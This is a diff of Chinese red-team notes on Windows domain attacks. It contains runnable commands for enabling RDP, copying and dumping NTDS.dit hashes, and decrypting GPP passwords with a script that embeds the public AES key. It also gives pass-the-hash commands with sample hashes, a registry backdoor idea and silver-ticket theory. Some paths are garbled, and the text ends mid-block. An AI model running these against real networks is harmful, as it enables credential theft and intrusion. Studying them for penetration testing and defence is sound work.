@@ -14,17 +14,24 @@
     * [多开](#多开)
     * [连接记录](#连接记录)
 
-* **[Hash](#hash)**
+* **[认证](#认证)**
     * [本地](#本地)
     * [域](#域)
-        * [NTDS.DIT](ntdsdit)
-        * [PTHPTKPTT](#pthptkptt)
-            * [PTH](#pth)
-            * [PTT](#ptt)
+        * [NTDS.DIT](#ntdsdit)
+            * [利用Dcsync获取域用户Hash](#利用dcsync获取域用户hash)
+            * [使用VSS卷影副本提取ntds.dit](#使用vss卷影副本提取ntdsdit)
+            * [NTDS转储](#ntds转储)
+        * [GPP](#gpp)
+        * [PTH](#pth)
+        * [PTT](#ptt)
+            * [Silver_Tickets](#silver_tickets)
+            * [Golden_Tickets](#golden_tickets)
+        * [PTK](#ptk)
         * [Kerberoast](#kerberoast)
         * [Kerberoasting](#kerberoasting)
         * [委派](#委派)
             * [查找域中委派主机或账户](#查找域中委派主机或账户)
+    * [毒化LLMNR和NBT-NS请求](#毒化llmnr和nbt-ns请求)
 
 * **[漏洞利用](#漏洞利用)**
     * [权限提升](#提权)
@@ -36,12 +43,14 @@
 # RDP
 
 **查看 3389 端口是否开启**
-
-`REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /*如果是0x0则开启`
+```
+REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /*如果是0x0则开启
+```
 
 **查看远程连接的端口**
-
-`REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber`
+```
+REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
+```
 
 **cmd 开 RDP**
 - 文章
@@ -55,7 +64,9 @@
 
     - **WMIC 开启 3389**
 
-         `wmic /namespace:\\root\CIMV2\TerminalServices PATH Win32_TerminalServiceSetting WHERE (__CLASS !="") CALL SetAllowTSConnections 1`
+        ```
+        wmic /namespace:\\root\CIMV2\TerminalServices PATH Win32_TerminalServiceSetting WHERE (__CLASS !="") CALL SetAllowTSConnections 1
+        ```
 
     - **PowerShell 开启 RDP**
         1. Enable RDP : `set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0`
@@ -90,7 +101,9 @@
 
     - **查看 3389 端口是否更改**
 
-        `REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber  /*出来的结果是 16 进制`
+        ```
+        REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber  /*出来的结果是 16 进制
+        ```
 
     - **允许3389端口**
         ```
@@ -99,10 +112,13 @@
 
     - **取消 xp&2003 系统防火墙对终端服务的限制及 IP 连接的限制:**
 
-        `REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f`
+        ```
+        REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f
+        ```
 
 **第三方连接工具**
 - [rdesktop/rdesktop](https://github.com/rdesktop/rdesktop)
+    - kali 自带,使用方法 : `rdesktop <ip>`
 - [Remmina](https://remmina.org/)
 - [FreeRDP/FreeRDP](https://github.com/FreeRDP/FreeRDP)
 
@@ -110,12 +126,12 @@
 
 ## 多开
 
-**文章**
+**相关文章**
 - [Win7 双开 3389](https://blog.csdn.net/SysProgram/article/details/11810889)
 - [渗透技巧——Windows 系统远程桌面的多用户登录](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/)
 - [Multi-User login in Windows 7/Vista/XP using Remote Desktop](http://zahirkhan.com/tools-utilities/multi-user-login-in-windows-7)
 
-**工具**
+**相关工具**
 - [stascorp/rdpwrap](https://github.com/stascorp/rdpwrap)
 
 - mimikatz
@@ -136,25 +152,23 @@
 
 ## 连接记录
 
-**文章**
+**相关文章**
 - [渗透技巧——获得 Windows 系统的远程桌面连接历史记录](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/)
 - [关于 windows 的 RDP 连接记录](http://rcoil.me/2018/05/%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95/)
 - [How to Clear RDP Connections History in Windows](http://woshub.com/how-to-clear-rdp-connections-history/#h2_3)
 
-**工具**
+**相关工具**
 - [3gstudent/List-RDP-Connections-History](https://github.com/3gstudent/List-RDP-Connections-History)
 
 ---
 
-# Hash
-
-**笔记**
+# 认证
 
 关于 windows 认证的基本知识点可见笔记 [认证](../../../运维/windows/笔记/认证.md)
 
 ## 本地
 
-**文章**
+**相关文章**
 - [几种windows本地hash值获取和破解详解](https://www.secpulse.com/archives/65256.html)
 - [Windows密码抓取总结](https://times0ng.github.io/2018/04/20/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/)
 - [深刻理解windows安全认证机制](https://klionsec.github.io/2016/08/10/ntlm-kerberos/)
@@ -162,7 +176,7 @@
 - [Windows下的密码hash——NTLM hash和Net-NTLM hash介绍](https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/)
 - [浅学Windows认证](https://b404.xyz/2019/07/23/Study-Windows-Authentication/)
 
-**工具**
+**相关工具**
 - [mimikatz](https://github.com/gentilkiwi/mimikatz) - 抓密码神器
     - [mimikatz](../../工具/mimikatz.md)
 - [skelsec/pypykatz](https://github.com/skelsec/pypykatz) - 用纯 Python 实现的 Mimikatz
@@ -179,83 +193,483 @@
 
 ## 域
 
-域部分内容来自 <sup>[[浅学Windows认证](https://b404.xyz/2019/07/23/Study-Windows-Authentication/)]</sup>
+**相关文章**
+- [横向渗透-域渗透 PTT、PTH、PTK](http://1984-0day.com/2020/04/05/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%B8%97%E9%80%8F-PTT%E3%80%81PTH%E3%80%81PTK/)
+- [我所了解的内网渗透——内网渗透知识大总结](https://www.anquanke.com/post/id/92646#h2-10)
 
 ### NTDS.DIT
 
-**文章**
+在域内 HASH 是存在 NTDS.DIT 中的， NTDS.DIT 是一个二进制文件，就等同于本地计算机的 SAM 文件，它的存放位置是 `%SystemRoot%\ntds\NTDS.DIT` 。这里面包含的不只是 Username 和 HASH，还有 OU、Group 等信息。
+
+AD 数据库是 Jet 数据库引擎，它使用提供数据存储和索引服务的可扩展存储引擎（ESE）ESE 级索引使对象属性可以快速定位。
+
+ntds.dit 文件由三个主表组成：数据表，链接表和SD表。
+
+**相关文章**
 - [从NTDS.dit获取密码hash的三种方法](https://www.freebuf.com/sectool/176876.html)
 - [导出域密码哈希值的多种方法介绍](https://www.freebuf.com/articles/system/177764.html)
+- [How Attackers Dump Active Directory Database Credentials](https://adsecurity.org/?p=2398)
 
-### PTH/PTK/PTT
+#### 利用Dcsync获取域用户Hash
 
-#### PTH
+**mimikatz**
+
+mimikatz 的 NTDS.DIT 攻击操作见 [mimikatz 笔记](../../工具/mimikatz.md#ntdsdit)
+
+#### 使用VSS卷影副本提取ntds.dit
+
+卷影副本，也称为快照，是存储在 Data Protection Manager (DPM) 服务器上的副本的时间点副本。副本是文件服务器上单个卷的受保护共享、文件夹和文件的完整时间点副本。
+
+**WMIC**
+```
+wmic /node:AD /user:PENTESTAdministrator /password:123qweQWE!@# process call create "cmd /c vssadmin create shadow /for=c: 2>&1 > c:vss.log"
+
+wmic /node:AD /user:PENTESTadministrator /password:123qwe!@#!@# process call create "cmd /c copy 卷影IDWindowsNTDSNTDS.dit C:windowstempNTDS.dit 2>&1"
+
+wmic /node:AD /user:PENTESTadministrator /password:123qwe!@# process call create "cmd /c copy 卷影IDWindowsSystem32configSYSTEM c:windowstempSYSTEM.hive 2>&1"
+
+net use k: \pentest.comc$
+```
+
+**metasploit**
+```bash
+auxiliary/admin/smb/psexec_ntdsgrab
+windows/gather/credentials/domain_hashdump
+hashdump
+```
+
+**NTDSUtil**
+
+Ntdsutil.exe 是一个为 Active Directory 提供管理设施的命令行工具。
+
+使用 NTDSUTIL 的 IFM 创建（VSS 卷影副本）在 DC 上本地引用 ntds.dit
+
+NTDSUtil 是本地处理 AD DB 的命令实用程序（ntds.dit），并为 DCPromo 启用 IFM 集创建。IFM 与 DCPromo 一起用于“从媒体安装”,因此被升级的服务器不需要通过网络从另一个 DC 复制域数据。
+```
+ntdsutil "ac i ntds" "ifm" "create full c:temp" q q
+```
+当创建一个 IFM 时，VSS 快照被拍摄，挂载，ntds.dit 文件和相关数据被复制到目标文件夹中。
+
+**Nishang**
+```
+Import-Module .\Copy-VSS.ps1
+Copy-VSS
+Copy-VSS -DestinationDir C:\ShadowCopy\
+```
+
+**PowerSploit**
+```
+Import-Module .\VolumeShadowCopyTools.ps1
+New-VolumeShadowCopy -Volume C:\
+Get-VolumeShadowCopy
+```
+
+**DiskShadow**
+
+DiskShadow是一个 Microsoft 签名二进制文件，用于协助管理员执行与卷影复制服务（VSS）相关的操作。这个二进制文件有两个模式 interactive 和 script ，脚本将包含自动执行 NTDS.DIT 提取过程所需的所有命令。我们可以在脚本文件中添加以下行，以创建新的 volume shadow copy（卷影复制），挂载新驱动，执行复制命令以及删除 volume shadow copy。
+```
+set context persistent nowriters
+add volume c: alias someAlias
+create
+expose %someAlias% z:
+exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
+delete shadows volume %someAlias%
+reset
+```
+
+需要注意的是，DiskShadow 二进制文件需要从 C:\Windows\System32 路径执行。如果从其它路径调用它，脚本将无法正确执行。
+```
+diskshadow.exe /s c:\diskshadow.txt
+```
+
+直接从解释器运行以下命令，将列出系统的所有可用 volume shadow copy。
+```
+diskshadow
+LIST SHADOWS ALL
+```
+
+SYSTEM 注册表 hive 也应该被复制，因为其包含了解密 NTDS 文件内容所需的密钥。
+```
+reg.exe save hklm\system c:\exfil\system.bak
+```
+
+**ntdsutil**
+```
+ntdsutil
+activate instance ntds
+ifm
+create full C:\ntdsutil
+quit
+quit
+```
+它将为我们生成两个新文件夹：Active Directory 和 Registry。NTDS.DIT 文件将被保存到 Active Directory 中，而 SAM 和 SYSTEM 文件则将被保存到 Registry 文件夹中。
+
+**vssadmin**
+
+volume shadow copy 是一个 Windows 命令行实用程序，管理员可以使用它备份计算机，卷以及文件（即使操作系统正在使用这些资源）。Volume Shadow Copy 作为一个服务运行，并要求文件系统的格式为 NTFS（默认情况下 windows 操作系统文件格式均为 NTFS）。从Windows 命令提示符执行以下命令，将会创建一个 C 盘的快照，这样我们就可以将其复制到另一个位置（如本地文件夹，网络文件夹或可移动介质）以获取它的访问权限。
+```
+vssadmin create shadow /for=C:
+```
+由于我们已经将 C 盘中的所有文件都复制到了另一个位置（HarddiskVolumeShadowCopy1），因此它们不会被操作系统直接使用，我们可以随意访问并复制其中的文件。使用 copy 命令将 NTDS.DIT 和 SYSTEM 文件，复制到本地名为 ShadowCopy 的驱动中的新建文件夹中。
+```
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
+```
+
+#### NTDS转储
+
+**Impacket-secretsdump**
+
+- https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
+
+Impacket 是一组 python 脚本，可用于执行各种任务，包括提取 NTDS 文件的内容。impacket-secretsdump 模块需要我们提供 SYSTEM 和 NTDS 数据库文件。
+```
+impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
+
+-system：表示系统 hive 文件的路径（SYSTEM）
+-ntds：表示 dit 文件的路径（ntds.dit）
+```
+
+此外，impacket 可以通过使用计算机帐户及其哈希进行身份验证从 NTDS.DIT 文件远程转储域密码哈希。
+```
+impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
+```
+
+**DSInternals PowerShell**
+
+- 工具地址 : [MichaelGrafnetter/DSInternals](https://github.com/MichaelGrafnetter/DSInternals)
+
+DSInternals PowerShell 模块提供了构建在框架之上的易于使用的 cmdlet。主要功能包括离线 ntds.dit 文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。
+```
+Save-Module DSInternals -Path C:\Windows\System32\WindowsPowershell\v1.0\Modules
+Install-Module DSInternals
+Import-Module DSInternals
+Get-Bootkey -SystemHivePath 'C:\Users\sanje\Desktop\NTDS\SYSTEM'
+Get-ADDBAccount -All -DBPath 'C:\Users\sanje\Desktop\NTDS\ntds.dit' -Bootkey $key
+```
+
+**Ntdsxtract**
+
+- 工具地址 : [libyal/libesedb](https://github.com/libyal/libesedb/)
+- 相关文章 : [Extracting Hashes and Domain Info From ntds.dit](https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/)
+
+首先我们需要从 NTDS.dit 文件中提取表格，这里我们可以通过 libesedb-tools 中的 esedbexport 来帮我们完成。Libesedb 是一个用于访问可扩展存储引擎（ESE）数据库文件（EDB）格式的库。当前，ESE 数据库格式被应用于许多不同的应用程序上，如 Windows Search，Windows Mail，Exchange，Active Directory（NTDS.dit）等。
+
+安装
+```
+get https://github.com/libyal/libesedb/releases/download/20200418/libesedb-experimental-20200418.tar.gz
+tar xf libesedb-experimental-20200418.tar.gz
+cd libesedb-20200418
+apt-get install autoconf automake autopoint libtool pkg-config
+./configure
+make
+make install
+ldconfig
+```
+
+利用该工具从 ntds.dit 文件中转储表格
+```
+esedbexport -m tables /root/Desktop/NTDS/ntds.dit
+```
+
+下载 ntdsxtract 提取用户信息和密码哈希值
+```
+git clone https://github.com/csababarta/ntdsxtract.git
+cd ntdsxtract
+python setup.py build && python setup.py install
+
+dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.6 data --syshive /root/Desktop/NTDS/SYSTEM --passwordhashes --pwdformat john --ntoutfile nthash.txt --lmoutfile lmhash.txt
+```
+
+---
+
+### GPP
+
+关于 windows 组策略的基本知识点可见笔记 [组策略](../../../运维/windows/笔记/组策略.md)
+
+在 GPP 出现之前，很多统一管理的操作只能通过脚本来实现，而 GPP 方便和简化了这样的管理,GPP 你可以将其理解为一个功能点,作用是简单化、规范化组策略的发布和使用。
+
+注 : GPP漏洞只在2008没打补丁版本上存在，超过2008版本的系统是没办法写入密码的。
+
+域管理员在使用组策略批量管理域内主机时，如果配置组策略的过程中需要填入密码，那么该密码会被保存到共享文件夹 \SYSVOL 下，默认所有域内用户可访问，虽然被加密，但很容易被解密,访问 XML 文件，利用 AES 私钥可以解密 GPP 密码。
+
+在2012年前的某些点外，微软在 MSDN 上发布了 AES 的私钥，它可以用来解密这种密码。因为认证用户（所有域用户或者信任域里的用户）对 SYSVOL 拥有读权限。在域里的任何用户可以搜索 SYSVOL 共享中的带有 cpassword 字样的 XML 文件，里面包含了 AES 加密的密码。
+
+![](../../../../assets/img/安全/笔记/RedTeam/Windows渗透/2.png)
+
+- 微软在 MSDN 上发布的 AES 加密密钥（共享密钥） : https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN
+
+使用 PowerShell 脚本解密 : https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
+
+参考 https://xz.aliyun.com/t/1653 ,可简化 powershell 脚本如下,替换其中 GPP 密码即可
+```powershell
+function Get-DecryptedCpassword {
+    [CmdletBinding()]
+    Param (
+        [string] $Cpassword
+    )
+
+    try {
+        #Append appropriate padding based on string length
+        $Mod = ($Cpassword.length % 4)
+
+        switch ($Mod) {
+        '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
+        '2' {$Cpassword += ('=' * (4 - $Mod))}
+        '3' {$Cpassword += ('=' * (4 - $Mod))}
+        }
+
+        $Base64Decoded = [Convert]::FromBase64String($Cpassword)
+
+        #Create a new AES .NET Crypto Object
+        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
+                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
+
+        #Set IV to all nulls to prevent dynamic generation of IV value
+        $AesIV = New-Object Byte[]($AesObject.IV.Length)
+        $AesObject.IV = $AesIV
+        $AesObject.Key = $AesKey
+        $DecryptorObject = $AesObject.CreateDecryptor()
+        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
+
+        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
+    }
+
+    catch {Write-Error $Error[0]}
+}
+Get-DecryptedCpassword "9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U"
+```
+
+**组策略中该目录下的其他 XML 文件**
+- \User\Preferences\Groups
+- Services\Services.xml
+- ScheduledTasks\ScheduledTasks.xml
+- Printers\Printers.xml
+- Drives\Drives.xml
+- DataSources\DataSources.xml
+
+**相关文章**
+- [域安全篇：寻找SYSVOL里的密码和攻击GPP（组策略偏好）](https://www.freebuf.com/vuls/92016.html)
+- [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)
+- [域渗透——利用SYSVOL还原组策略中保存的密码](https://xz.aliyun.com/t/1653)
+- [windows2008 GPP漏洞利用](https://bl4ck.in/penetration/2015/08/14/windows2008-GPP%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.html)
+- [浅析域渗透中的组策略利用](https://xz.aliyun.com/t/7784)
+
+**修复方案**
+- 在每台用于管理 GPO 的电脑上安装 KB2962486 补丁，这样会避免新的凭据放进 GPP 里。
+- 删除现有的 GPP 里包含密码的 xml 文件。
+
+---
+
+### PTH
 
 path-the-hash,中文直译过来就是 hash 传递，在域中是一种比较常用的攻击方式。
 
-在内网中，获取不到明文密码，且破解不了 hash 时，可以使用 hash 传递，扩展权限。
+在内网中，获取不到明文密码，且破解不了 hash 又想扩大战果时，可以使用 hash 传递，扩展权限。
+
+**必要条件**
+
+- 哈希传递需要被认证的主机能够访问到服务器
+- 哈希传递需要被传递认证的用户名
+- 哈希传递需要被传递认证用户的 NTLM Hash
 
 **攻击方式**
 
 通常来说，pass-the-hash 的攻击模式是这样的：
 1. 获取一台域主机高权限
-2. 利用mimikatz等工具导出密码hash
-3. 用导出的hash尝试登陆其他域主机
+2. 利用 mimikatz 等工具导出密码 hash
+3. 用导出的 hash 尝试登陆其他域主机
 
-根据 NTLM 质询/响应的过程，可以知道哈希传递就是利用对应用户名的 NTLM Hash 加密服务器生成的 Challenge（即 Response），进行比对，完成认证.
+要完成一个 NTLM 认证，第一步需要客户端将自己要参与认证的用户名发送至服务器端，等待服务器端给出的 Challenge⋯⋯,其实哈希传递就是使用用户名对应的 NTLM Hash 将服务器给出的 Chanllenge 加密，生成一个 Response，来完成认证。
+
+Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程，所以不算是一个漏洞，算是一个技巧。
 
 比如 SMB 可以直接基于 TCP 协议或者 NetBIOS over TCP，SMB 的认证可以基于 SMB，也可以基于 kerberos，这两种认证方式，前者本质上使用了 hash，后者本质上使用了 ticket，导致了 SMB 的 PtH 和 PtT 攻击存在的基础。
 
 目前常用的 hash 传递工具都是通过 445 端口进行攻击的，也是因为 smb 使用了 ntml 认证，所以导致可以 hash 传递。
 
-**文章**
+- **mimikatz**
+
+    mimikatz 的 PTH 相关操作见 [mimikatz 笔记](../../工具/mimikatz.md#pth)
+
+- **wmiexec**
+    - [Invoke-WMIExec](https://github.com/wsfengfan/Invoke-TheHash)
+        ```
+        Invoke-Module Invoke-TheHash.psd1
+        Invoke-WMIExec -Target 192.168.3.21 -Domain workgroup -Username administrator -Hash ccef208c6485269c20db2cad21734fe7 -Command "calc.exe" -verbose
+        ```
+
+    - [wmiexec](https://github.com/maaaaz/impacket-examples-windows)
+        ```
+        wmiexec -hashes 00000000000000000000000000000000:ccef208c6485269c20db2cad21734fe7 workgroup/administrator@192.168.3.21 "whoami"
+        ```
+
+- **metasploit**
+    ```bash
+    use exploit/windows/smb/psexec # 或 use exploit/windows/smb/psexec_psh
+    set rhosts <ip>
+    set smbuser <user>
+    set smbpass <password>      # 例如: 00000000000000000000000000000000:c780c78872a102256e946b3ad238f661
+
+    # 工具的参数需要填写固定格式 LM hash:NT hash，可以将 LM hash 填 0(LM hash 可以为任意值)，即 00000000000000000000000000000000:NT hash。
+    exploit
+    ```
+
+- **pth-winexe**
+
+    kali 自带的 PTH 套件每个工具都针对 WIN 下相应的 EXE 文件,如使用 Pth-winexe 可以借助哈希执行程序得到一个 cmdshell:
+    ```bash
+    export SMBHASH=xxxxxx...:xxxx...
+    pth-winexe -U administrator% //target-ip cmd
+    # no password 就需要替换成空的 LM hash 加密值: aad3b435b51404eeaad3b435b51404ee
+    ```
+
+- **CrackMapExec**
+    - 工具地址 : https://github.com/byt3bl33d3r/CrackMapExec
+
+    ```
+    cme smb x.x.x.x -u administrator -H xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx -x whoami
+    ```
+
+**kb2871997**
+
+> 以下部分内容来自 <sup>[[Windows内网协议学习NTLM篇之NTLM基础介绍](https://www.anquanke.com/post/id/193149)]</sup>
+
+在 type3 计算 response 的时候，客户端是使用用户的 hash 进行计算的，而不是用户密码进行计算的。因此在模拟用户登录的时候。是不需要用户明文密码的，只需要用户 hash。微软在2014年5月13日发布了针对 Pass The Hash 的更新补丁kb2871997，能够缓解 PTH,同时，当服务器安装 KB2871997 补丁后，系统默认禁用 Wdigest Auth,内存（lsass 进程）不再保存明文口令。Mimikatz 将读不到密码明文。
+
+但 kb2871997 对于本地 Administrator(rid 为 500，操作系统只认 rid 不认用户名，接下来我们统称 RID 500 帐户)和本地管理员组的域用户是没有影响的。
+
+但 ntlm 认证通过之后，对 ADMIN$ 没有写入权限。那么是什么阻止了我们对本地管理员组的非 RID500 帐户使用哈希传递？为什么 RID 500 帐户具有特殊情况？除此之外，为什么本地管理员成员的域帐户也可以免除这种阻止行为。
+
+真正罪魁祸首是远程访问上下文中的用户帐户控制（UAC）令牌筛选
+
+对于远程连接到 Windows Vista+ 计算机的任何非 RID 500 本地管理员帐户，无论是通过 WMI，PSEXEC 还是其他方法(有个例外，那就是通过 RDP 远程)，即使用户是本地管理员，返回的令牌都是已过滤的管理员令牌。
+
+管理员组的非 RID500 账户登录之后是没有过 UAC 的，所有特权都被移除，除了 Change Notify 之类的。而 RID500 账户登录之后也以完全管理特权（”完全令牌模式”）运行所有应用程序，实际是不用过 UAC 的，这个可以自己测试下。
+
+对于本地“管理员”组中的域用户帐户，文档指出：当具有域用户帐户的用户远程登录 Windows Vista 计算机并且该用户是 Administrators 组的成员时，域用户将在远程计算机上以完全管理员访问令牌运行，并且该用户的 UAC 被禁用在该会话的远程计算机上。
+
+如果 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy 项存在(默认不存在)且配置为 1，将授予来自管理员所有本地成员的远程连接完整的高完整性令牌。这意味着未过滤非 RID 500 帐户连接，并且可以成功传递哈希值！
+
+默认情况下这个注册表项是不存在的，我们可以用以留作后门，但是有意思的是，我们之前提过一嘴的，在配置 winrm 的时候，也会遇到同样的问题，本地管理员组的非 RID500 账户不能登录，于是有些运维在搜寻了一堆文章后，开启该注册表项是最快捷有效的问题:)。
+
+**相关文章**
 - [hash传递攻击研究](http://sh1yan.top/2019/05/19/Hash-Passing-Attack-explore/)
 - [Passing-the-Hash to NTLM Authenticated Web Applications](https://labs.f-secure.com/blog/pth-attacks-against-ntlm-authenticated-web-applications/) - PTH 在 Web 应用中的应用
-- [Pass the Hash with Kerberos :: malicious.link](https://malicious.link/post/2018/pass-the-hash-with-kerberos/)
+- [浅学Windows认证](https://b404.xyz/2019/07/23/Study-Windows-Authentication/)
 
-**mimikatz**
+---
 
-mimikatz 的 PTH 相关操作见 [mimikatz 笔记](../../工具/mimikatz.md#哈希传递) 哈希传递部分
+### PTT
 
-**metasploit**
-```bash
-use exploit/windows/smb/psexec
-set rhosts <ip>
-set smbuser <user>
-set smbpass <password>
-exploit
+票据传递攻击（PtT）是一种使用 Kerberos 票据代替明文密码或 NTLM 哈希的方法。PtT 最常见的用途可能是使用黄金票据和白银票据，通过 PtT 访问主机相当简单。
+
+**相关文章**
+- [浅学Windows认证](https://b404.xyz/2019/07/23/Study-Windows-Authentication/)
+- [白银票据与黄金票据探究](http://sh1yan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/)
+- [Pass the Hash with Kerberos :: malicious.link](https://malicious.link/post/2018/pass-the-hash-with-kerberos/) - Kerberos 中的 PTH
+- [如何通过 SSH 隧道进行域渗透的 PtT 攻击](https://paper.seebug.org/321/)
+- [How Attackers Use Kerberos Silver Tickets to Exploit Systems ](https://adsecurity.org/?p=2011)
+- [Kerberos Golden Tickets are Now More Golden](https://adsecurity.org/?p=1640)
+
+**相关工具**
+- [gentilkiwi/kekeo](https://github.com/gentilkiwi/kekeo)
+
+#### Silver_Tickets
+
+**原理**
+
+白银票据主要是发生在第五步骤上,在 AP_REQ 中的 ST 的组成:
+```
+k(c,tgs)加密[Session_key],[Server_ntlm_hash(Tiket（K(c,s),Client_Name(domainName\Username),TGT_EndTime）)]
 ```
 
-**pth-winexe**
-
-kali 自带的 PTH 套件每个工具都针对 WIN 下相应的 EXE 文件,如使用 Pth-winexe 可以借助哈希执行程序得到一个 cmdshell:
-```bash
-export SMBHASH=xxxxxx...:xxxx...
-pth-winexe -U administrator% //target-ip cmd
-# no password 需要替换成空的 LM hash 加密值: aad3b435b51404eeaad3b435b51404ee
+在第四步骤时，票据生成服务器（TGS）给我们发了上面的数据，在第五步骤时，我们需要发送下面的数据。
+```
+K(c,s)加密[Authenticator（[DomainName\Username,ServerName(DomainName\Server)]）],[Tiket（Server_ntlm_hash(Tiket（K(c,s),Client_Name(domainName\Username),TGT_EndTime）)）]
 ```
 
-**Kerberos**
-- [Pass the Hash with Kerberos](https://malicious.link/post/2018/pass-the-hash-with-kerberos/)
-```bash
-ktutil                      # 使用 ktutil 创建一个 keytab 文件
-ktutil: addent -p uberuser@CORP.SOMEWHATREALNEWS.COM -k 1 -key -e rc4-hmac  # 指定用户和FQDN的全大写版本
-Key for uberuser@CORP.SOMEWHATREALNEWS.COM (hex): 88e4d9fabaecf3dec18dd80905521b29  # 输入rc4-hmac（NTLM）哈希值
-ktutil: wkt /tmp/a.keytab   # 把 keytab 文件写到磁盘上
-ktutil: exit                # 退出
-kinit -V -k -t /tmp/a.keytab -f uberuser@CORP.SOMEWHATREALNEWS.COM  # 使用keytab 文件创建一个kerberos ticket
-klist                       # 验证
+从需要发送的数据上看，当拥有 Server Hash 时，我们就可以伪造一个不经过 KDC 认证的一个 Ticket，这个也就是白银票据。
+
+PS : Server Session Key 在未发送 Ticket 之前，服务器是不知道 Server Session Key 是什么的。 所以，一切凭据都来源于 Server Hash。
+
+伪造的 `Client-To-Server Ticket`(也有唤作 ST 和 Service Ticket)被称为白银票据。在不与 KDC 通信情况下，通过获取 Server 端服务账号的 NTLM Hash 值，就能伪造该 Server 端服务的票据。不过在 TGT 中已包含了服务实例的唯一标识(SPN 服务)，白银票据就只能访问指定的服务。
+
+**白银票据特点**
+
+1. 不需要与 KDC 进行交互
+2. 需要目标服务的 NTLM Hash
+3. 从攻击面来看，伪造白银票据的难度比伪造黄金票据的难度较小，因为一个域中的服务器如果对外的话，非常容易被入侵，并且容易被转储 Server。
+4. 从防御角度来看，需要开启 PAC 认证，但这会降低认证效率，增加 DC 的负担，最根本的还是要加固服务器本身对外的服务。
+5. 因为需要目标机器的 Hash,并且也不是通过伪造 TGT 申请的,因此只能针对对应服务伪造票据(黄金票据直接伪造的是 TGT,而白金票据伪造的是 TGS 发送的票据,也就是说是单向车程)
+
+**白银票据的攻击流程**
+
+1. 获取服务端计算机的服务账号或者服务端计算机账号的 NTLM 哈希（如通过 kerberoast 获取）
+2. 通过 mimikatz 的 kerberos::golden 传递域 SID、目标主机名、服务名称、伪造的用户名、等信息创建白银票据
+3. 将票据注入到内存，并访问服务
+
+- **mimikatz**
+
+    mimikatz 的 Silver_Tickets 相关操作见 [mimikatz 笔记](../../工具/mimikatz.md#Silver_Tickets)
+
+- **ktutil**
+    ```bash
